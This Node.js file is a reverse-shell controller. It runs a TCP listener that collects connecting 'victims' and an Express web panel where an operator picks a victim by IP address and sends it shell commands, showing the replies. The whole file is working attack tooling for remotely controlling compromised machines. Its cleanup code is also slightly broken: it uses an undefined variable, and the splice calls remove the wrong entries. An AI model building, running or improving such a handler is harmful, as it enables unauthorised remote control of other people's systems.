var express = require('express');
var bodyParser = require('body-parser');
var nunjucks = require('nunjucks');     // Templating language inspired in jinja2
var net = require('net');
var date = require('./dateFormat');

var app = express();
app.use(bodyParser.urlencoded({extended:true}));
nunjucks.configure('views', {
    autoescape: true,
    express: app
});

/************************ TCP server **********************/
var tcpPort = 1337;
var victims = [];
var commandLine = '';

// Function passed as parameter is executed for every new connection
net.createServer(function(sock) {
    console.log('%s Victim %s connected', date.format(), sock.remoteAddress );

    // Event listeners for end of connection
    sock.on('close', function() {
        victims.splice(victims.indexOf(sock), 1);
        console.log('%s Victim %s disconnected', date.format(), sock.remoteAddress);
    });
    sock.on('error', function (err){
        victims.splice(victims.indexOf(sock), 1);
        console.log('%s Victim %s disconnected because of error: %s', date.format(), remoteAddress, err.message);  
    });

    // Event listener for initial messages in case there is one
    sock.on('data', function(data){
        console.log('%s Victim sent first message %s', date.format(), data);
    });

    victims.push({socket: sock, initialized: false});
}).listen(tcpPort, '127.0.0.1');

// Remove possible event listener for receiving first messages
function initializeCommandLine(victim){
    commandLine = '';
    victim.socket.removeAllListeners('data');
    victim.initialized = true;
}

// Wrapper for waiting asynchronously
function waitForResponse(socket) {
    return new Promise((resolve) => {           // Promise to resolve in the future
        socket.once('data', function(data) {    // Note that we register the event listener once, otherwise, it would apply every time there is a response
            commandLine += data;
            console.log('%s Victim %s responded: %s', date.format(), socket.remoteAddress, data);
            resolve(true);
        });
        socket.once('close', function() {
            resolve(false);
        });
        socket.once('error', function (err) {
            resolve(false);
        });
    });
}


/******************* Web application server ********************/

app.get('/', function (req, res) {
    if (victims.length == 0){
        res.render('index.html');
    }
    else{
        res.render('hub.html', { victims });
    }
})

app.get('/*.*.*.*', function (req, res) {
    let i, found = false, victim;
    
    for (i = 0; i < victims.length; i++){
        if (victims[i].socket.remoteAddress === req.url.substr(1)){
            victim = victims[i];
        }
    }
    if (!victim){
        res.redirect(303, '/');
    }
    else{
        initializeCommandLine(victim);
        res.render('victim.html', { victim, commandLine });
    }
})

app.post('/*.*.*.*', function (req, res) {
    let i, found = false, victim;
    
    for (i = 0; i < victims.length; i++){
        if (victims[i].socket.remoteAddress === req.url.substr(1)){
            victim = victims[i];
        }
    }
    if (!victim || !victim.initialized){
        res.redirect(303, '/');
    }
    else{
        victim.socket.write(req.body.command + "\n");
        commandLine += " > " + req.body.command + "\n";
        console.log("%s User sent command: %s", date.format(), req.body.command);
        waitForResponse(victim.socket).then(successful => { // If victim really responds or if it closes the socket
            if (successful){
                res.render('victim.html', { victim, commandLine});
            }
            else{
                res.redirect(303, '/');
            }
        });
    }
})

app.listen(8080);